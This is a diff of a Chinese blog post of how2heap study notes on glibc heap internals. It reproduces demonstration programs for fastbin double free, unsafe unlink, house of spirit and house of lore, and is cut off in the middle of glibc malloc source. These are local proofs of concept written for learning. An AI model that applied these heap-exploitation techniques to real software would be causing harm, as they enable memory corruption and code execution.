@@ -2,8 +2,7 @@
     <meta charset="utf-8">
     <meta name="keywords" content="how2heap学习笔记, Du4t~~~~">
     <meta name="description" content="堆的基础知识堆是如何分配的在内存中堆有两种分配方式 一种是mmap另外一种是brk 这两者的区别是
-mmap:是当申请的堆块size>128kb时 使用mmap分配brk:是当申请的堆块sizefd     BK=p->bk
-FD->bk=">
+mmap:是当申请的堆块size&gt;128kb时 使用mmap分配brk:是当申请的堆块size&lt;128kb的时候 使用brk分配">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -451,14 +450,14 @@ FD->bk=">
                     
                     <div class="info-break-policy">
                         <i class="far fa-file-word fa-fw"></i>文章字数:  
-                        1.1k
+                        5.5k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="far fa-clock fa-fw"></i>阅读时长:  
-                        5 分
+                        26 分
                     </div>
                     
                 
@@ -474,9 +473,9 @@ FD->bk=">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><h2 id="堆的基础知识"><a href="#堆的基础知识" class="headerlink" title="堆的基础知识"></a>堆的基础知识</h2><h3 id="堆是如何分配的"><a href="#堆是如何分配的" class="headerlink" title="堆是如何分配的"></a>堆是如何分配的</h3><p>在内存中堆有两种分配方式 一种是<code>mmap</code>另外一种是<code>brk</code> 这两者的区别是</p>
-<p><code>mmap</code>:是当申请的堆块size>128kb时 使用mmap分配<br><code>brk</code>:是当申请的堆块size<128kb的时候 使用brk分配 且第一次分配132kb(main arena) 第二次在brk下分配 如果不够则执行系统调用 向内核重新申请< p>
-</p><h3 id="chunk是什么"><a href="#chunk是什么" class="headerlink" title="chunk是什么"></a>chunk是什么</h3><p>在内存中进行堆块管理的时候 系统基本是以chunk啦作为基本单位的 chunk的结构为</p>
+                <h2 id="堆的基础知识"><a href="#堆的基础知识" class="headerlink" title="堆的基础知识"></a>堆的基础知识</h2><h3 id="堆是如何分配的"><a href="#堆是如何分配的" class="headerlink" title="堆是如何分配的"></a>堆是如何分配的</h3><p>在内存中堆有两种分配方式 一种是<code>mmap</code>另外一种是<code>brk</code> 这两者的区别是</p>
+<p><code>mmap</code>:是当申请的堆块size>128kb时 使用mmap分配<br><code>brk</code>:是当申请的堆块size<128kb的时候 使用brk分配 且第一次分配132kb(main arena) 第二次在brk下分配 如果不够则执行系统调用 向内核重新申请</p>
+<h3 id="chunk是什么"><a href="#chunk是什么" class="headerlink" title="chunk是什么"></a>chunk是什么</h3><p>在内存中进行堆块管理的时候 系统基本是以chunk啦作为基本单位的 chunk的结构为</p>
 <pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> malloc_chunk <span class="token punctuation">{</span>
     INTERNAL_SIZE_T prev_size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Size of previous chunk (if free). */</span>
     INTERNAL_SIZE_T size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Size in bytes, including overhead. */</span>
@@ -495,21 +494,26 @@ FD->bk=">
 <blockquote>
 <p><code>fastbin</code>:</p>
 <pre><code>  根据chunk大小维护多个单向链表 
-  sizeof(chunk)<64(bytes) 下一个chunk的free标志位不清除 即显示上一个堆块仍在使用 具有和栈一样filo的机制 即先被`free`的先被`malloc` 维护有固定大小chunk的十个链表< code><!--64(bytes)--></code></pre><p><code>unsortedbin</code>:</p>
+  sizeof(chunk)<64(bytes)
+  下一个chunk的free标志位不清除 即显示上一个堆块仍在使用
+  具有和栈一样FILO的机制 即先被`free`的先被`malloc`
+  维护有固定大小chunk的十个链表</code></pre><p><code>unsortedbin</code>:</p>
 <pre><code>  双向循环链表
   不排序
   暂时存储被`free`之后的chunk 过了一段时间后会将chunk放入对应的bin中
   只有一个链表</code></pre><p><code>smallbin</code>:</p>
 <pre><code>  双向循环链表
-  sizeof(chunk)<512(bytes) 具有类似于队列的fifo机制 共有62个链表 < code><!--512(bytes)--></code></pre><p><code>largebin</code>:</p>
+  sizeof(chunk)<512(bytes)
+  具有类似于队列的FIFO机制
+  共有62个链表       </code></pre><p><code>largebin</code>:</p>
 <pre><code>  双向循环链表
   sizeof(chunk)>512(bytes)
   `free chunk`中多了两个指针分别指向前后的large chunk</code></pre></blockquote>
 <p>虽然<code>fastbin</code>和<code>smallbin</code>的范围有重叠 但是chunk并不重复 <code>fastbin</code>主要作用是跟cache一样 提高malloc速度 unsortedbin也是一样</p>
 <h2 id="how2heap学习笔记"><a href="#how2heap学习笔记" class="headerlink" title="how2heap学习笔记"></a>how2heap学习笔记</h2><h3 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h3><p>这个样例主要是演示了glibc的一种分配机制 即被free之后的chunk会依据chunk大小先放到<code>unsorted bin</code>或者<code>fast bin</code>中 如果后续继续malloc 会先去这两个里去找 如果没有合适的 会将<code>unsorted bin</code>中所有的堆块 放到适合的bin中</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></stdlib.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><string.h></string.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><string.h></span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -543,11 +547,11 @@ FD->bk=">
     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd allocation %p points to %s\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"first allocation %p points to %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
+<span class="token punctuation">}</span><span class="token operator"><</span><span class="token operator">/</span>string<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
 <p>代码中释放了chunk a 此时chunk a在<code>unsorted bin</code>中 后续继续<code>malloc(0x500)</code>时因为在<code>unsorted bin</code>中没有合适的chunk给分配 于是<code>unsorted bin</code>将其中所有的chunk放到适合的bin中 接着重新分配 因为<code>size</code>>512所以应该去<code>large bin</code>中分配 因为glibc倾向于将刚释放的内存分配出去 所以又重新将chunk a分割后分配出去 就此用户就可以拿到两个指向同一个chunk的指针</p>
 <h3 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h3><p>这个案例是讲述了一个最简单的针对<code>fast bin</code>的<code>double free</code>攻击 源码如下</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></stdlib.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -579,15 +583,15 @@ FD->bk=">
     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(8): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(8): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
-</code></pre>
+<span class="token operator"><</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
 <p>glibc 2.23对<code>double free</code>的检测非常好绕过 glibc只检测bin最上面的一个chunk是不是即将要free的chunk 如果是 那么程序就crash并报出<code>double free</code>的错误 所以程序在<code>free</code>了chunk a之后选择<code>free</code>了chunk b来绕过<code>double free</code>的检测 因为chunk a被<code>free</code>了两次 所以在<code>fast bin</code>中存储了两个chunk a 接下来三次<code>malloc</code>就会发现用户申请的第一个指针和第三个指针都指向同一个堆块</p>
 <h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3><blockquote>
 <p>虽然这个不是第一个项目 但是是刚刚弄懂的..就赶紧记录下来了</p>
 </blockquote>
 <p>案例源码如下</p>
 <pre class=" language-c"><code class="language-c">
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -618,7 +622,7 @@ FD->bk=">
 
     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 
-<span class="token punctuation">}</span></code></pre>
+<span class="token punctuation">}</span><span class="token operator"><</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
 <p>阅读源码可以知道 首先有一个<code>double free</code>漏洞 这样在fastbin中chuck a和chuck b的fd指针都指向彼此 这样就会形成一个死循环 无论怎么重新<code>malloc</code>申请堆块 只要size一样 申请出来的都是chuck a和chuck b且交替出现</p>
 <p>此时<code>double free</code>后fastbin中两个chuck的状态</p>
 <p><img src="https://s2.ax1x.com/2020/01/24/1V4b7Q.png" alt="1V4b7Q.png"></p>
@@ -632,9 +636,9 @@ FD->bk=">
 <p>这样操作就可以通过<code>double free</code>拿到栈上一个指针 </p>
 <h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><p>这个样例主要是用于解释另外一种可以用于绕过<code>double free</code>检测的机制<code>malloc_consolidate()</code> 案例如下</p>
 <pre class=" language-c"><code class="language-c">
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdint.h></stdint.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdint.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">void</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -651,7 +655,7 @@ FD->bk=">
   <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We can pass the check in malloc() since p1 is not fast top.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
-</code></pre>
+<span class="token operator"><</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>stdint<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
 <p><code>malloc_cosolidate()</code>函数在程序中主要有两个作用 第一是初始化<code>fastbin</code>和清空<code>fastbin</code> 清空<code>fastbin</code>时 首先将相同大小的chunk根据fd指针从前到后一一合并 如果在合并完之后 这个大chunk紧贴着<code>top chunk</code>那么就把这个chunk合并进<code>top chunk</code>中 如果不相邻就将这个chunk放到<code>unsorted bin</code>中 那么当触发这个机制的时候<code>fastbin</code>的所有chunk都会被清空 然后通过<code>unsorted bin</code>重新放到合适的bin中 此时<code>fastbin</code>的顶部就不是p1指针了 再<code>free(p1)</code> 此时p1指针就同时出现在了<code>fastbin</code>和<code>small bin</code>中</p>
 <p><img src="https://s2.ax1x.com/2020/01/31/13hNU1.png" alt="13hNU1.png"></p>
 <h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h3><p>我吐了 这个案例卡了一周多 资料也很少能找到…要么就是一句话带过..太难了 </p>
@@ -701,10 +705,10 @@ FD->bk=">
 </blockquote>
 <p>经过限制后 似乎<code>unlink</code>机制只能实现将chunk2的指针向前提了3*8个字节的位置 但是如果chunk2是一个全局变量 处于bss段上 那么就可以通过预设bss段的指针来实现任意位置写</p>
 <p>测试样例</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></stdlib.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><string.h></string.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdint.h></stdint.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdint.h></span></span>
 
 
 uint64_t <span class="token operator">*</span>chunk0_ptr<span class="token punctuation">;</span>
@@ -758,8 +762,198 @@ uint64_t <span class="token operator">*</span>chunk0_ptr<span class="token punct
     chunk0_ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4141414142424242LL</span><span class="token punctuation">;</span>
     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"New Value: %s\n"</span><span class="token punctuation">,</span>victim_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
-</code></pre>
+<span class="token operator"><</span><span class="token operator">/</span>stdint<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>string<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
 <p>最后再解释下后面几句是在干嘛 当执行完<code>free(chunk1_ptr1)</code>时 此时的<code>chunk0_ptr=chunk0_ptr-3</code> 然后再<code>chunk0_ptr[3] = (uint64_t) victim_string</code> 此时的指针情况就是 <code>chunk0_ptr->chunk0_ptr-3->victim_string</code> 然后后面改写值就合理了 也就造成了任意地址写</p>
+<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>这个案例主要是对<code>fastbin</code>进行攻击 可以通过构建一个假的chunk结构 在<code>free</code>掉这个假的chunk后 就可以通过再次<code>malloc</code>来拿到特定地址的指针 造成任意可控 通过描述可以发现 其实<code>house_of_spirit</code>并不能单独达到<code>getshell</code>的目的 而是一种通过堆的<code>fastbin</code>机制来辅助栈溢出的手法 一般的栈溢出都要求覆盖掉返回地址以达到控制<code>EIP</code>的目的 但是如果栈溢出的长度不够 无法直接溢出到返回地址 但是却可以溢出到一个可以被<code>free</code>的指针 那么我们就可以通过覆盖指针地址 且在指针指向的地址伪造出一个chunk结构来达到控制返回地址的目的</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates the house of spirit attack.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Calling malloc() once so that it sets up its memory.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_chunks<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&</span>fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// this is the size</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>
+    fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// nextsize</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span><span class="token punctuation">,</span> <span class="token operator">&</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    a <span class="token operator">=</span> <span class="token operator">&</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the overwritten pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span><span class="token punctuation">,</span> <span class="token operator">&</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc(0x30): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token operator"><</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator"><</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
+<p>但是<code>free</code>函数的执行是有条件的  在伪造chunk的时候 首先是需要注意标志位 chunk的低三位是标志位 最后一位<code>PREV_INUSE</code>位不影响<code>free</code>函数的执行 但是<code>IS_MMAPPED</code>位和<code>NON_MAIN_ARENA</code>都需要为0 其次是需要注意<code>size</code>字段的大小 必须是在<code>fastbin</code>的范围内 即32-128(bytes)之间 最后<code>free</code>函数不光对指针指向的chunk进行检测 他同样还会检测物理相邻的chunk是否正常 <code>free</code>函数会检测<code>next chunk</code>的<code>size</code>字段的值是否大于<code>2*SIZE_SZ</code>且小于<code>av->system_mem</code> 即在16-128(bytes)之间 释放成功之后的效果如下图</p>
+<p><img src="https://s2.ax1x.com/2020/02/04/10Tqt1.png" alt="10Tqt1.png"></p>
+<h3 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h3><p>之前的<code>house_of_spirit</code>是针对<code>fastbin</code>进行的攻击 而<code>house_of_lore</code>则是针对<code>small bin</code>进行的攻击 <code>house_of_lore</code>可以造成在任意指定位置上申请一个chunk 从而造成修改任意地址的内存 当然使用<code>house_of_lore</code>也是有要求的 他要求能够控制<code>small bin</code>的<code>bk</code>指针 并且控制指定位置的<code>fd</code>指针 攻击利用的原理是 如果在执行<code>malloc</code>的时候 申请的内存块是在<code>small bin</code>内 那么就会执行以下流程</p>
+<pre class=" language-c"><code class="language-c">  <span class="token comment" spellcheck="true">//检测申请的内存块是不是在smallbin中</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token comment" spellcheck="true">//获取smallbin的索引</span>
+      idx <span class="token operator">=</span> <span class="token function">smallbin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token comment" spellcheck="true">//获取bin中对应chunk的索引</span>
+      bin <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token comment" spellcheck="true">//victim等于smallbin中最后的chunk 且victim!=bin 即victim不为空</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">last</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> bin<span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+          <span class="token comment" spellcheck="true">//获取victim的上一个chunk</span>
+          bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
+          <span class="token comment" spellcheck="true">//如果victim上一个chunk的fd指针没有指向victim则程序报错</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): smallbin double linked list corrupted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token comment" spellcheck="true">//设置victim的INUSE位</span>
+          <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token comment" spellcheck="true">//修改链表</span>
+          bin<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
+          bck<span class="token operator">-></span>fd <span class="token operator">=</span> bin<span class="token punctuation">;</span>
+
+          <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&</span>main_arena<span class="token punctuation">)</span>
+        <span class="token function">set_non_main_arena</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property">#<span class="token directive keyword">if</span> USE_TCACHE</span>
+      <span class="token comment" spellcheck="true">/* While we're here, if we see other chunks of the same size,
+         stash them in the tcache.  */</span>
+      size_t tc_idx <span class="token operator">=</span> <span class="token function">csize2tidx</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache <span class="token operator">&&</span> tc_idx <span class="token operator"><</span> mp_<span class="token punctuation">.</span>tcache_bins<span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+          mchunkptr tc_victim<span class="token punctuation">;</span>
+
+          <span class="token comment" spellcheck="true">/* While bin not empty and tcache not full, copy chunks over.  */</span>
